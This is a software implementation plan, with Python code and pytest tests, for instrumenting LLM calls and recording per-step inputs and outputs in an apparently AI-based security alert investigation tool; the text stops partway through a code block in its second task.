# Report Observability and Export Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make an investigation report say what actually happened — per-step inputs/outputs, verbatim LLM prompts and responses, token usage and latency — while making the database and the JSON file agree, surfacing the experimental triage output in `show-report`, and writing a Markdown report alongside the JSON.

**Architecture:** `LLMClient.generate_structured` starts returning `LLMResponse[T]` (parsed value + `LLMCallRecord`) instead of a bare value, and `LLMClientError` carries the same record so failed calls are measured too. The state graph collects those records per step and rolls them into `Report.llm_usage`. Persistence gains the three columns it was silently dropping, the finalize step moves inside the saved payload, and a new `app/report_render.py` becomes the single definition of report sections, rendered as text for the terminal and as Markdown for the file.

**Tech Stack:** Python 3.12, Pydantic v2 / SQLModel, `openai` SDK against Ollama's OpenAI-compatible endpoint, `typer`, `pytest` + `respx`.

**Spec:** `docs/superpowers/specs/2026-08-17-report-observability-and-export-design.md`

## Global Constraints

- **Branch:** all work lands on `feat/report-observability-and-export`.
- **`InvestigationStep.output_summary` strings are frozen.** `bench/score.py:47` and `bench/analyze.py:94` regex-parse them (`r"audited (\d+) claim\(s\), (\d+) flagged"`). Never reword an `output_summary`; add data in new fields only.
- **New model fields must have defaults.** Existing `data/reports/*.json`, existing `reports` rows, and `tests/test_schemas.py::_make_report` must all keep validating without change.
- **No Alembic in this project.** `init_db` calls `SQLModel.metadata.create_all`, which does not add columns to an existing table. New columns require deleting `data/alerts.db`; that is a documented step, not a migration.
- **British English** in all prose and docstrings. `RM` for currency, `DD MMM YYYY` for dates. Not expected to arise in this work.
- **No linter is configured.** Match surrounding style: 4-space indent, double quotes, type hints on public functions, comments that explain *why*.
- **Test command:** `pytest -q` from the repo root with `.venv` activated. Live tests skip unless `WAZUH_*` is configured and `LLM_MODEL` is pulled; that is expected and is not a failure.
- **Verbatim capture is deliberate.** Prompts contain `full_log`. Do not add truncation, redaction, or hashing — the spec chose full fidelity (§7 records the consequence).

---

### Task 1: LLM call instrumentation

The LLM client learns to report on itself, and the state graph starts collecting what it reports. These are one task because splitting them leaves the suite red in between: changing the Protocol's return type breaks all seven call sites at once, so the two halves have no independently green state to commit at.

**Files:**
- Modify: `app/llm/client.py` (whole file)
- Modify: `app/llm/errors.py` (whole file)
- Modify: `app/llm/ollama_client.py:41-92`
- Modify: `app/schemas.py` — `InvestigationStep`
- Modify: `app/agent/state_graph.py` — the seven LLM helpers and their callers
- Test: `tests/test_ollama_client.py`, `tests/test_llm_client_protocol.py`, `tests/test_state_graph.py`

**Interfaces:**
- Consumes: nothing.
- Produces:
  - `app.llm.client.LLMCallRecord` — Pydantic model, fields listed in Step 3.
  - `app.llm.client.LLMResponse[T]` — Pydantic generic with `.value: T` and `.call: LLMCallRecord`.
  - `LLMClient.generate_structured(self, prompt: str, schema: type[T], prompt_ref: str) -> LLMResponse[T]` — `prompt_ref` is required and positional.
  - `LLMClientError.call: LLMCallRecord | None` — populated on every raise from `OllamaClient`.
  - `InvestigationStep.llm_calls: list[LLMCallRecord]` and `.output: dict | None` (the latter added here, populated in Task 2).
  - Each of the seven LLM helpers in `state_graph.py` returns its records alongside its value — exact signatures in Step 6.

**Measured backend behaviour this task encodes** (verified 17 Aug 2026 against `gemma4:12b`, spec §1.1.1):
- Ollama populates `usage`; `prompt_tokens` tracks input size and is trustworthy.
- `completion_tokens` counts the JSON content only — a response with 1,608 characters of reasoning reported `completion_tokens: 18`. Never treat it as a cost or throughput figure.
- The reasoning trace is exposed as `message.reasoning` via the SDK's `model_extra`, and is captured because it is the majority of what the model produces.

- [ ] **Step 1: Add usage and reasoning to the test helper, and write the failing client tests**

In `tests/test_ollama_client.py`, replace `_chat_completion_response` with a version that emits a `usage` block and an optional reasoning trace. The `include_usage` switch keeps the "backend omits usage" path tested even though the current backend always sends it — a different model or a future Ollama build may not:

```python
def _chat_completion_response(
    parsed_content: str,
    finish_reason: str = "stop",
    prompt_tokens: int = 120,
    completion_tokens: int = 40,
    include_usage: bool = True,
    reasoning: str | None = None,
) -> httpx.Response:
    message = {"role": "assistant", "content": parsed_content, "refusal": None}
    if reasoning is not None:
        # Ollama returns the reasoning trace as a non-standard sibling of `content`;
        # the OpenAI SDK surfaces it through model_extra rather than a typed field.
        message["reasoning"] = reasoning
    body = {
        "id": "chatcmpl-1",
        "object": "chat.completion",
        "created": 1234567890,
        "model": "qwen3.5:9b",
        "choices": [{"index": 0, "message": message, "finish_reason": finish_reason}],
    }
    if include_usage:
        body["usage"] = {
            "prompt_tokens": prompt_tokens,
            "completion_tokens": completion_tokens,
            "total_tokens": prompt_tokens + completion_tokens,
        }
    return httpx.Response(200, json=body)
```

Every existing call site of `_chat_completion_response` in this file keeps working unchanged — the new parameters all have defaults.

Now append these tests:

```python
@respx.mock
def test_generate_structured_returns_response_with_call_record():
    respx.post(f"{BASE_URL}chat/completions").mock(
        return_value=_chat_completion_response('{"label": "malicious", "confidence": "high"}')
    )
    client = OllamaClient(base_url=BASE_URL, model="qwen3.5:9b")

    response = client.generate_structured("classify this", Verdict, "build_test_prompt")

    assert response.value.label == "malicious"
    call = response.call
    assert call.prompt_ref == "build_test_prompt"
    assert call.prompt == "classify this"
    assert call.attempts == 1
    assert call.retried is False
    assert call.raw_response is None
    assert call.parsed_output == {"label": "malicious", "confidence": "high"}
    assert call.prompt_tokens == 120
    assert call.completion_tokens == 40
    assert call.error_kind is None
    assert call.latency_ms >= 0


@respx.mock
def test_call_record_reports_none_tokens_when_backend_omits_usage():
    respx.post(f"{BASE_URL}chat/completions").mock(
        return_value=_chat_completion_response(
            '{"label": "clean", "confidence": "low"}', include_usage=False
        )
    )
    client = OllamaClient(base_url=BASE_URL, model="qwen3.5:9b")

    call = client.generate_structured("classify this", Verdict, "build_test_prompt").call

    assert call.prompt_tokens is None
    assert call.completion_tokens is None
    # The rest of the record is unaffected by a backend that does not report usage.
    assert call.attempts == 1
    assert call.parsed_output == {"label": "clean", "confidence": "low"}


@respx.mock
def test_call_record_captures_the_reasoning_trace():
    """completion_tokens counts the JSON only; the reasoning is where the output went.

    Measured on gemma4:12b: 1,608 characters of reasoning reported as 18 completion
    tokens. Without this the record would claim a 40-token call that in fact generated
    several hundred tokens' worth of text.
    """
    respx.post(f"{BASE_URL}chat/completions").mock(
        return_value=_chat_completion_response(
            '{"label": "malicious", "confidence": "high"}',
            reasoning="The source IP appears in three prior alerts, so this is not isolated.",
        )
    )
    client = OllamaClient(base_url=BASE_URL, model="qwen3.5:9b")

    call = client.generate_structured("classify this", Verdict, "build_test_prompt").call

    assert call.reasoning == "The source IP appears in three prior alerts, so this is not isolated."


@respx.mock
def test_call_record_reasoning_is_none_for_a_model_that_does_not_emit_one():
    respx.post(f"{BASE_URL}chat/completions").mock(
        return_value=_chat_completion_response('{"label": "clean", "confidence": "low"}')
    )
    client = OllamaClient(base_url=BASE_URL, model="qwen3.5:9b")

    call = client.generate_structured("classify this", Verdict, "build_test_prompt").call

    assert call.reasoning is None


@respx.mock
def test_call_record_sums_tokens_across_the_retry_and_keeps_the_bad_response():
    respx.post(f"{BASE_URL}chat/completions").mock(
        side_effect=[
            _chat_completion_response("not valid json at all", prompt_tokens=100, completion_tokens=10),
            _chat_completion_response(
                '{"label": "malicious", "confidence": "high"}', prompt_tokens=150, completion_tokens=30
            ),
        ]
    )
    client = OllamaClient(base_url=BASE_URL, model="qwen3.5:9b")

    call = client.generate_structured("classify this", Verdict, "build_test_prompt").call

    assert call.attempts == 2
    assert call.retried is True
    # The prompt stored is the original; the retry prompt is that text plus a fixed suffix.
    assert call.prompt == "classify this"
    assert "not valid json at all" in call.raw_response
    assert call.prompt_tokens == 250
    assert call.completion_tokens == 40


@respx.mock
def test_timeout_error_carries_a_call_record():
    respx.post(f"{BASE_URL}chat/completions").mock(side_effect=httpx.TimeoutException("too slow"))
    client = OllamaClient(base_url=BASE_URL, model="qwen3.5:9b")

    with pytest.raises(LLMClientError) as exc_info:
        client.generate_structured("classify this", Verdict, "build_test_prompt")

    call = exc_info.value.call
    assert call is not None
    assert call.error_kind == "timeout"
    assert call.prompt_ref == "build_test_prompt"
    assert call.prompt == "classify this"
    assert call.attempts == 1
    assert call.parsed_output is None
    assert call.latency_ms >= 0


@respx.mock
def test_validation_failure_after_retry_carries_a_call_record():
    respx.post(f"{BASE_URL}chat/completions").mock(
        return_value=_chat_completion_response("still not json")
    )
    client = OllamaClient(base_url=BASE_URL, model="qwen3.5:9b")

    with pytest.raises(LLMClientError) as exc_info:
        client.generate_structured("classify this", Verdict, "build_test_prompt")

    call = exc_info.value.call
    assert call is not None
    assert call.error_kind == "validation_failed"
    assert call.attempts == 2
    assert call.retried is True
    assert call.prompt_tokens == 240  # 120 per attempt, both attempts reached the model
```

Update the three existing tests that call `generate_structured` to pass a `prompt_ref` and read `.value`:

```python
# test_generate_structured_returns_parsed_object_on_first_attempt
result = client.generate_structured("classify this", Verdict, "build_test_prompt").value

# test_generate_structured_retries_once_after_non_conforming_first_attempt
result = client.generate_structured("classify this", Verdict, "build_test_prompt").value

# any remaining `client.generate_structured(...)` call in this file gains the same
# third argument; error-path tests keep using pytest.raises unchanged.
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `pytest tests/test_ollama_client.py -q`
Expected: FAIL — `TypeError: generate_structured() takes 3 positional arguments but 4 were given`, and `AttributeError: 'Verdict' object has no attribute 'value'`.

- [ ] **Step 3: Define the record and response models**

Replace `app/llm/client.py` entirely:

```python
from typing import Any, Generic, Protocol, TypeVar, runtime_checkable

from pydantic import BaseModel

T = TypeVar("T", bound=BaseModel)


class LLMCallRecord(BaseModel):
    """One `generate_structured` call, not one HTTP attempt.

    The schema retry means a single logical call can hit the model twice; token counts
    and latency are summed across attempts so a report's totals match what the machine
    actually spent.
    """

    prompt_ref: str
    prompt: str
    retried: bool = False
    # Only populated when an attempt failed to parse — on a clean first attempt the
    # parsed object is the faithful record and the raw text adds nothing.
    raw_response: str | None = None
    # The last attempt's reasoning trace. Measured on gemma4:12b, this is the bulk of
    # what the model generates and `usage` does not count a token of it: 1,608
    # characters of reasoning were reported as 18 completion tokens. Kept for the
    # last attempt only — a failed attempt's reasoning led to output already preserved
    # in raw_response.
    reasoning: str | None = None
    parsed_output: dict[str, Any] | None = None
    attempts: int
    # None when the backend does not report usage; never 0, which would read as
    # "measured, and it was free".
    prompt_tokens: int | None = None
    # Counts the structured content only, NOT the reasoning trace. Not a cost or
    # throughput figure — use latency_ms for that.
    completion_tokens: int | None = None
    latency_ms: int
    error_kind: str | None = None


class LLMResponse(BaseModel, Generic[T]):
    value: T
    call: LLMCallRecord


@runtime_checkable
class LLMClient(Protocol):
    def generate_structured(self, prompt: str, schema: type[T], prompt_ref: str) -> LLMResponse[T]: ...
    def health_check(self) -> bool: ...
    def model_available(self) -> bool: ...
    # A method rather than an attribute, matching the rest of this Protocol and
    # keeping isinstance() checks against it well-defined.
    def model_name(self) -> str: ...
```

- [ ] **Step 4: Let the error carry its record**

Replace `app/llm/errors.py` entirely:

```python
from app.llm.client import LLMCallRecord


class LLMClientError(Exception):
    def __init__(self, kind: str, message: str, call: LLMCallRecord | None = None):
        # "unreachable" | "model_not_found" | "generation_failed" | "validation_failed" | "timeout"
        self.kind = kind
        # A failed call still costs wall-clock time and tokens; without this the most
        # expensive calls in a run (timeouts) would be the only ones never measured.
        self.call = call
        super().__init__(message)
```

`app/llm/client.py` must not import from `app/llm/errors.py`, or this import becomes circular. It does not.

- [ ] **Step 5: Instrument `OllamaClient`**

In `app/llm/ollama_client.py`, add imports at the top:

```python
import time
from dataclasses import dataclass

from app.llm.client import LLMCallRecord, LLMResponse, T
```

(replacing the existing `from app.llm.client import T`).

Add the tally just below `_RETRY_NOTE`:

```python
@dataclass
class _CallTally:
    """What accumulated across the attempts of one logical call."""

    attempts: int = 0
    prompt_tokens: int | None = 0
    completion_tokens: int | None = 0
    # Last attempt wins: on a retry the earlier trace led to output that failed
    # validation, and that output is already kept in raw_response.
    reasoning: str | None = None

    def add_usage(self, usage) -> None:
        # One attempt without usage poisons the total: a sum missing an unknown term is
        # not a smaller sum, it is an unknown sum.
        if usage is None:
            self.prompt_tokens = None
            self.completion_tokens = None
            return
        if self.prompt_tokens is not None:
            self.prompt_tokens += usage.prompt_tokens
            self.completion_tokens += usage.completion_tokens
```

Replace `generate_structured` (currently lines 41-51):

```python
    def generate_structured(self, prompt: str, schema: type[T], prompt_ref: str) -> LLMResponse[T]:
        started = time.monotonic()
        tally = _CallTally()
        try:
            result = self._attempt(prompt, schema, tally)
            if result is not None:
                return LLMResponse(
                    value=result,
                    call=self._record(prompt_ref, prompt, tally, started, parsed=result),
                )

            first_bad = self._last_raw_content
            retry_prompt = prompt + _RETRY_NOTE.format(previous=first_bad)
            result = self._attempt(retry_prompt, schema, tally)
            if result is not None:
                return LLMResponse(
                    value=result,
                    call=self._record(
                        prompt_ref, prompt, tally, started, parsed=result, raw_response=first_bad
                    ),
                )
            raise LLMClientError("validation_failed", "schema validation failed after one retry")
        except LLMClientError as exc:
            # Every raise site funnels through here, so no failure path can escape
            # unmeasured — including the validation_failed raised just above.
            if exc.call is None:
                exc.call = self._record(
                    prompt_ref, prompt, tally, started,
                    raw_response=self._last_raw_content, error_kind=exc.kind,
                )
            raise

    def _record(
        self, prompt_ref: str, prompt: str, tally: _CallTally, started: float,
        parsed=None, raw_response: str | None = None, error_kind: str | None = None,
    ) -> LLMCallRecord:
        return LLMCallRecord(
            prompt_ref=prompt_ref,
            prompt=prompt,
            retried=tally.attempts > 1,
            raw_response=raw_response,
            reasoning=tally.reasoning,
            parsed_output=parsed.model_dump(mode="json") if parsed is not None else None,
            attempts=tally.attempts,
            prompt_tokens=tally.prompt_tokens,
            completion_tokens=tally.completion_tokens,
            latency_ms=int((time.monotonic() - started) * 1000),
            error_kind=error_kind,
        )
```

Change `_attempt`'s signature to take the tally, count the attempt on entry, and record usage and reasoning once the response arrives. The edits inside the existing body:

```python
    def _attempt(self, prompt: str, schema: type[T], tally: _CallTally) -> T | None:
        tally.attempts += 1
        try:
            completion = self._client.beta.chat.completions.parse(
                ...unchanged...
            )
        ...all existing except: blocks unchanged...

        tally.add_usage(completion.usage)
        message = completion.choices[0].message
        # Ollama returns the reasoning trace as a non-standard field, so the SDK parks
        # it in model_extra rather than a typed attribute. Read both: a future SDK that
        # types it would otherwise silently stop being captured.
        tally.reasoning = getattr(message, "reasoning", None) or (message.model_extra or {}).get("reasoning")
        ...rest unchanged...
```

Counting on entry rather than on success is what makes a transport failure still report `attempts == 1`.

- [ ] **Step 6: Run the client tests to verify they pass**

Run: `pytest tests/test_ollama_client.py tests/test_llm_client_protocol.py -q`
Expected: PASS.

`tests/test_llm_client_protocol.py` has its own minimal stub that must move to the new signature — replace its `generate_structured` and the assertion that reads the result:

```python
    def generate_structured(self, prompt, schema, prompt_ref):
        return LLMResponse(
            value=schema(text=prompt),
            call=LLMCallRecord(prompt_ref=prompt_ref, prompt=prompt, attempts=1, latency_ms=0),
        )
```

```python
def test_fake_client_satisfies_llm_client_protocol():
    client: LLMClient = _FakeLLMClient()
    response = client.generate_structured("hello", _EchoResult, "stub_ref")
    assert response.value.text == "hello"
    assert response.call.prompt_ref == "stub_ref"
    assert client.health_check() is True
    assert client.model_available() is True
    assert isinstance(client, LLMClient)
```

with `from app.llm.client import LLMCallRecord, LLMClient, LLMResponse` at the top.

`pytest -q` as a whole is still red at this point — `tests/test_state_graph.py` calls the old signature. That is expected mid-task and is what Steps 7-11 close. Do not commit here.

- [ ] **Step 7: Update the state graph's fake client and write the failing tests**

In `tests/test_state_graph.py`, replace `_FakeLLMClient.generate_structured` and add the record factory:

```python
from app.llm.client import LLMCallRecord, LLMResponse


def _fake_call(prompt: str, prompt_ref: str = "fake_ref") -> LLMCallRecord:
    return LLMCallRecord(
        prompt_ref=prompt_ref, prompt=prompt, attempts=1, latency_ms=7,
        prompt_tokens=11, completion_tokens=5,
    )


class _FakeLLMClient:
    def __init__(self, model_available=True, responses=None, error=None,
                 model_name="fake-model:test"):
        self._model_available = model_available
        self._model_name = model_name
        self._responses = responses or {}  # {schema_class: return_value}
        self._error = error
        self.calls: list[tuple[str, type]] = []

    def generate_structured(self, prompt, schema, prompt_ref):
        self.calls.append((prompt, schema))
        if self._error is not None:
            raise self._error
        if schema in self._responses:
            return LLMResponse(
                value=self._responses[schema], call=_fake_call(prompt, prompt_ref)
            )
        raise NotImplementedError(f"no canned response configured for {schema}")
```

`test_fake_llm_client_records_prompt_and_schema_per_call` needs its two calls updated to pass a third argument; its assertion on `client.calls` is unchanged.

Any test constructing `_FakeLLMClient(error=LLMClientError("timeout", "..."))` still works — the error simply has `call is None`, which is exactly the "client raised without a record" case the state graph must tolerate.

Add these tests:

```python
def test_risk_assessment_step_records_its_llm_call():
    analyst = _make_analyst(llm_client=_FakeLLMClient(responses={
        RiskAssessment: RiskAssessment(
            severity=Severity.HIGH, confidence=Confidence.MEDIUM, rationale="because"
        )
    }))
    alert = _make_alert()

    _assessment, step = analyst._step_risk_assessment(
        alert, PatternType.NONE, 0, [], model_available=True
    )

    assert len(step.llm_calls) == 1
    assert step.llm_calls[0].prompt_ref == "build_risk_assessment_prompt"
    assert step.llm_calls[0].prompt_tokens == 11


def test_risk_assessment_step_records_the_call_that_failed():
    error = LLMClientError("timeout", "too slow", call=LLMCallRecord(
        prompt_ref="build_risk_assessment_prompt", prompt="p", attempts=1,
        latency_ms=360000, error_kind="timeout",
    ))
    analyst = _make_analyst(llm_client=_FakeLLMClient(error=error))
    alert = _make_alert()

    _assessment, step = analyst._step_risk_assessment(
        alert, PatternType.NONE, 0, [], model_available=True
    )

    assert len(step.llm_calls) == 1
    assert step.llm_calls[0].error_kind == "timeout"
    assert step.llm_calls[0].latency_ms == 360000
    # The existing degrade behaviour is untouched.
    assert "risk assessment failed" in _assessment.rationale


def test_llm_client_error_without_a_record_does_not_break_the_step():
    analyst = _make_analyst(llm_client=_FakeLLMClient(error=LLMClientError("timeout", "too slow")))
    alert = _make_alert()

    _assessment, step = analyst._step_risk_assessment(
        alert, PatternType.NONE, 0, [], model_available=True
    )

    assert step.llm_calls == []


def test_draft_report_step_records_both_canonical_and_experimental_calls():
    analyst = _make_analyst(llm_client=_FakeLLMClient(responses={
        DraftReportCanonical: DraftReportCanonical(
            alert_summary="s", rationale="r",
            recommended_actions=[RecommendedAction.ESCALATE_TO_IR],
        ),
        DraftReportExperimental: DraftReportExperimental(
            recommended_actions_freeform=["do a thing"],
            triage_verdict=TriageVerdict.TRUE_POSITIVE, triage_rationale="tr",
        ),
    }))
    alert = _make_alert()
    risk = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")

    _draft, _experimental, step = analyst._step_draft_report(
        alert, PatternType.NONE, 0, [], risk, model_available=True
    )

    assert [c.prompt_ref for c in step.llm_calls] == [
        "build_draft_canonical_prompt", "build_draft_experimental_prompt"
    ]


def test_steps_without_a_model_call_record_no_llm_calls():
    analyst = _make_analyst()
    alert = _make_alert()

    step = analyst._step_ingest_and_parse(alert, model_available=True)

    assert step.llm_calls == []
```

- [ ] **Step 8: Run the tests to verify they fail**

Run: `pytest tests/test_state_graph.py -q`
Expected: FAIL — `AttributeError: 'InvestigationStep' object has no attribute 'llm_calls'`.

- [ ] **Step 9: Add the fields to the schema**

In `app/schemas.py`, extend `InvestigationStep` (currently lines 111-117):

```python
class InvestigationStep(BaseModel):
    step_name: str
    action: str
    tool_used: str | None = None
    input: dict[str, Any] | None = None
    output: dict[str, Any] | None = None
    output_summary: str
    llm_calls: list[LLMCallRecord] = Field(default_factory=list)
    timestamp: datetime
```

with `from app.llm.client import LLMCallRecord` at the top. `output` is added here so Task 2 does not have to touch the schema again; nothing populates it yet.

Both new fields default, so every stored report still validates — `tests/test_schemas.py` proves it without modification.

- [ ] **Step 10: Thread records through the seven call sites**

Each LLM helper returns its records alongside its value. In `app/agent/state_graph.py`:

```python
    def _extract_indicators_via_llm(
        self, alert: Alert, extra_texts: list[str] | None = None
    ) -> tuple[list[Indicator], int, int, str | None, list[LLMCallRecord]]:
        prompt = build_extract_indicators_prompt(alert, extra_texts)
        logger.debug("_extract_indicators_via_llm prompt: %s", prompt)
        try:
            response = self._llm_client.generate_structured(
                prompt, ExtractedIndicators, "build_extract_indicators_prompt"
            )
        except LLMClientError as exc:
            logger.debug("_extract_indicators_via_llm failed: %s", exc.kind)
            return [], 0, 0, exc.kind, _records(exc)
        result = response.value
        logger.debug("_extract_indicators_via_llm result: %s", result.model_dump_json())
        ...unchanged validation loop...
        return validated, len(result.candidates), len(validated), None, [response.call]
```

with this helper next to `_merge_indicators`:

```python
def _records(exc: LLMClientError) -> list[LLMCallRecord]:
    """The failed call's record, or nothing if the client did not supply one.

    A client that raises without a record is valid (the Protocol does not require it),
    so this must degrade to an empty list rather than a None in the list.
    """
    return [exc.call] if exc.call is not None else []
```

Apply the same shape to the other six. Their new signatures and `prompt_ref` values:

| Helper | Returns | `prompt_ref` |
|---|---|---|
| `_extract_indicators_via_llm` | `tuple[list[Indicator], int, int, str \| None, list[LLMCallRecord]]` | `build_extract_indicators_prompt` |
| `_classify_correlation` | `tuple[CorrelationDecision, list[LLMCallRecord]]` | `build_correlation_decision_prompt` |
| `_run_open_value_search` | `tuple[str, list[LLMCallRecord]]` | `build_open_value_search_prompt` |
| `_assess_risk` | `tuple[RiskAssessment, list[LLMCallRecord]]` | `build_risk_assessment_prompt` |
| `_draft_canonical` | `tuple[DraftReportCanonical, list[LLMCallRecord]]` | `build_draft_canonical_prompt` |
| `_draft_experimental` | `tuple[DraftReportExperimental \| None, list[LLMCallRecord]]` | `build_draft_experimental_prompt` |
| `_run_self_check` | `tuple[SelfCheckResult \| None, str \| None, list[LLMCallRecord]]` | `build_self_check_prompt` |

Two of them need care beyond mechanical unpacking:

`_run_open_value_search` returns a note string and already swallows its error with a bare `except LLMClientError: return ""` — that becomes `except LLMClientError as exc: return "", _records(exc)`. Its SIEM-search failure paths return their existing strings plus the record list it already holds.

`_step_correlate` collects from two helpers into one list:

```python
        decision, calls = self._classify_correlation(alert, results, evidence_count, enrichment_results)
        pattern_type = decision.pattern_type
        ...
        open_value_note = ""
        if pattern_type in (PatternType.NONE, PatternType.OTHER):
            open_value_note, open_value_calls = self._run_open_value_search(alert, results)
            calls += open_value_calls
```

and passes `llm_calls=calls` when it builds its `InvestigationStep`. Each of the seven steps' `InvestigationStep(...)` constructions gains `llm_calls=<that step's list>`; the `model_available=False` branches pass nothing and keep the default empty list.

**Do not touch any `output_summary` string.**

- [ ] **Step 11: Run the whole suite to verify it is green again**

Run: `pytest -q`
Expected: PASS, full suite (live tests skipped unless the stack is up). This is the first green point since Step 5, and the task is not complete until it is green.

- [ ] **Step 12: Commit**

```bash
git add app/llm/ app/schemas.py app/agent/state_graph.py tests/
git commit -m "feat(llm): measure every structured generation, step by step

Token usage, latency and attempt count had nowhere to come out — the
completion object was discarded inside _attempt. generate_structured now
returns LLMResponse[T] and each investigation step keeps the records of
the calls it made, so a self-check that times out after six minutes is a
measured call rather than the string 'call failed'.

Captures the reasoning trace too: Ollama's usage counts the JSON content
only, reporting 18 completion tokens for a response carrying 1,608
characters of reasoning, so without it the record would describe a
fraction of what the model generated."
```

---

### Task 2: Per-step inputs and outputs

**Files:**
- Modify: `app/agent/state_graph.py` — every `InvestigationStep(...)` construction
- Test: `tests/test_state_graph.py`

**Interfaces:**
- Consumes: `InvestigationStep.output` (added in Task 1, Step 9).
- Produces: every step in a completed timeline has a non-`None` `input`; every non-skipped step has a non-`None` `output`.

- [ ] **Step 1: Write the failing tests**

```python
def test_every_step_records_its_input(_tmp_path=None):
    analyst = _make_analyst(llm_client=_FakeLLMClient(model_available=False))
    alert = _make_alert()

    report = analyst.investigate(alert)

    for step in report.investigation_timeline:
        assert step.input is not None, f"{step.step_name} recorded no input"


def test_gather_context_records_the_context_it_fetched():
    siem = _FakeSIEMConnector(
        agent_context=AgentContext(
            id="001", name="web-01", ip="10.0.0.5", os_platform="ubuntu", status="active"
        ),
        rule_metadata=RuleMetadata(
            rule_id="5710", description="sshd failure", level=5,
            groups=["syslog", "sshd"], mitre_technique_ids=["T1110"],
        ),
    )
    analyst = _make_analyst(siem=siem)
    alert = _make_alert()

    _agent_context, _rule_metadata, step = analyst._step_gather_context(alert)

    assert step.output["agent_context"]["os_platform"] == "ubuntu"
    assert step.output["rule_metadata"]["mitre_technique_ids"] == ["T1110"]


def test_gather_context_records_null_output_when_the_siem_is_unavailable():
    siem = _FakeSIEMConnector(context_error=SIEMConnectorError("timeout", "gone"))
    analyst = _make_analyst(siem=siem)

    _agent_context, _rule_metadata, step = analyst._step_gather_context(_make_alert())

    assert step.output == {"agent_context": None, "rule_metadata": None}
    assert step.action == "degraded"


def test_extract_indicators_records_the_indicators_it_validated():
    analyst = _make_analyst(llm_client=_FakeLLMClient(model_available=False))
    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")

    _indicators, _decode, step = analyst._step_extract_indicators(alert, model_available=False)

    assert {"type": "ip", "value": "203.0.113.5"} in step.output["indicators"]
    assert step.output["regex"]["validated"] >= 1


def test_risk_assessment_records_its_typed_output():
    analyst = _make_analyst(llm_client=_FakeLLMClient(responses={
        RiskAssessment: RiskAssessment(
            severity=Severity.HIGH, confidence=Confidence.MEDIUM, rationale="because"
        )
    }))

    _assessment, step = analyst._step_risk_assessment(
        _make_alert(), PatternType.BRUTE_FORCE, 12, [], model_available=True
    )

    assert step.input["pattern_type"] == "brute_force"
    assert step.input["evidence_count"] == 12
    assert step.output == {
        "severity": "high", "confidence": "medium", "rationale": "because"
    }


def test_output_summary_wording_is_unchanged_for_the_self_check_step():
    """bench/score.py and bench/analyze.py regex this string; it must not drift."""
    analyst = _make_analyst(llm_client=_FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim="a", supported=True),
            ClaimAudit(claim="b", supported=True),
            ClaimAudit(claim="c", supported=False, correction=None),
        ])
    }))
    draft = DraftReportCanonical(
        alert_summary="a", rationale="b",
        recommended_actions=[RecommendedAction.ESCALATE_TO_IR],
    )
    risk = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")
    correlate_step = InvestigationStep(
        step_name="correlate", action="completed", output_summary="pattern_type=none",
        timestamp=datetime.now(timezone.utc),
    )

    _draft, _notes, step = analyst._step_self_check(
        _make_alert(), draft, PatternType.NONE, 0, [], risk, correlate_step,
        model_available=True,
    )

    assert step.output_summary == "audited 3 claim(s), 1 flagged"
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `pytest tests/test_state_graph.py -q`
Expected: FAIL — `assert None is not None` on the input assertions, `TypeError: 'NoneType' object is not subscriptable` on the output ones.

- [ ] **Step 3: Populate input and output on every step**

The values, step by step. Each is added to the existing `InvestigationStep(...)` call; nothing else in those functions changes.

`_step_ingest_and_parse`:
```python
            input={
                "alert_id": str(alert.alert_id),
                "rule_id": alert.rule_id,
                "rule_level": alert.rule_level,
                "model_available": model_available,
            },
            output={},
```

`_step_extract_indicators` — both the model-unavailable branch and the main one:
```python
            input={
                "full_log_chars": len(alert.full_log),
                "data_keys": sorted(alert.data),
                "extra_texts_count": len(extra_texts),
            },
            output={
                "regex": {"candidates": candidate_count, "validated": validated_count},
                "llm": {"candidates": llm_candidate_count, "validated": llm_validated_count},
                "decode": {
                    "segments": len(command_decode_result.decoded_segments) if command_decode_result else 0,
                    "discarded": decode_discarded,
                },
                "indicators": [
                    {"type": i.indicator_type.value, "value": i.value} for i in merged
                ],
            },
```
In the model-unavailable branch use `"llm": {"candidates": 0, "validated": 0}` and `validated` in place of `merged`.

`_step_enrich` — skipped branch gets `input={"indicators": []}`, `output={"results": []}`; the main branch:
```python
            input={"indicators": [
                {"type": i.indicator_type.value, "value": i.value} for i in indicators
            ]},
            output={"results": [
                {
                    "type": r.indicator_type.value, "value": r.indicator_value,
                    "provider_id": r.provider_id, "verdict": r.verdict.value,
                    "score": r.score, "error": r.error,
                }
                for r in results
            ]},
```

`_step_gather_context` — both branches:
```python
            input={"agent_id": alert.agent.id, "rule_id": alert.rule_id},
            # Degraded branch:
            output={"agent_context": None, "rule_metadata": None},
            # Success branch — the first time this step's own data reaches the report:
            output={
                "agent_context": agent_context.model_dump(mode="json"),
                "rule_metadata": rule_metadata.model_dump(mode="json"),
            },
```

`_step_correlate` — both branches:
```python
            input={
                "templates_built": sorted(t.value for t, q in queries.items() if q is not None),
                "enrichment_verdicts": [
                    {"value": e.indicator_value, "verdict": e.verdict.value}
                    for e in enrichment_results
                ],
            },
            output={
                "canonical": {
                    t.value: {
                        "total_count": r.total_count,
                        "distinct_counts": distinct_value_counts(r.alerts),
                    }
                    for t, r in results.items()
                },
                "pattern_type": pattern_type.value,
                "evidence_count": evidence_count,
                "failed_searches": failed_count,
            },
```
Import `distinct_value_counts` from `app.agent.correlation_queries` — the module is already imported for `build_canonical_queries`. In the model-unavailable branch `pattern_type` is `PatternType.OTHER`; use `PatternType.OTHER.value`.

`_step_risk_assessment` — both branches:
```python
            input={
                "pattern_type": pattern_type.value,
                "evidence_count": evidence_count,
                "enrichment_verdicts": [e.verdict.value for e in enrichment_results],
                "has_command_context": command_context is not None,
                "has_raw_log": _context_raw_log(alert) is not None,
            },
            output=assessment.model_dump(mode="json"),
```

`_step_draft_report` — both branches:
```python
            input={
                "pattern_type": pattern_type.value,
                "evidence_count": evidence_count,
                "severity": risk_assessment.severity.value,
                "confidence": risk_assessment.confidence.value,
                "has_command_context": command_context is not None,
            },
            output={
                "canonical": draft.model_dump(mode="json"),
